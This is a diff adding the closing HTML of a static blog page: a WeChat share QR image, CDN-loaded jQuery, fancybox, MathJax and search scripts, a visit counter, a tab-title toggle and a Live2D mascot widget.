+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACIUlEQVR42u3ay27CMBAFUP7/p6nUVSUauHdMquIcr1AUEp8sRvPw7Rav+/c6+v3zyuM9yZ2P63bGwsDA+FjG/ek6uid5TrLRoyv53jAwMK7DyINsEoKfP23lvYfXMTAwMMqA24bL9Y+CgYGBkZSXSZI3uxMDAwMjL2LbBtmsJD69FsfAwPhAxvpg4LzffzrfwMDA+JeM+8KK0rVRA67eCQYGxtaMtq32PGVsB5ZtifsiKGNgYFyAkfx5ZRiZvDFPTDEwMK7GeBdp1lZrnxlhMDAwNmIkN82OR8yGlPnwEgMD4zqMJBWbDR1nhy3y0hcDAwOj/XMecPMQ3xbMGBgYezPytlpSB8/Su5bxomuIgYGxESMPpvnLZkleHvpftNswMDA2ZZw3XGwTwbaExsDAuAIjTxDbIDsbiK6PRTEwMHZltAliHprbMrgN2VFljIGBsQVjWDouY2ZHVJN2HgYGxk6MWThbD7X5W06ZbGBgYHw4I29+5dudBda8VMbAwNibkZey7RjyXQfCMDAwMNpNtEfE2qZb8uF+eTIGBsbWjDYFbI985ZvLG/0v7sTAwNiOcS9XXmqulLJtsoiBgbE3I18rxx3O/hAYGBhXYMzSvvz+/C1twMXAwLgaY2XcmByMWAnZGBgYGCuMd4XmdmyAgYGB0Tb0V7aYfJphnY2BgbEdY70oTZ6Zj0jbcIyBgbE3Yz0ot+ld21Armm4YGBi7Mb4AwTnrQTXb30YAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '点这里看看！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
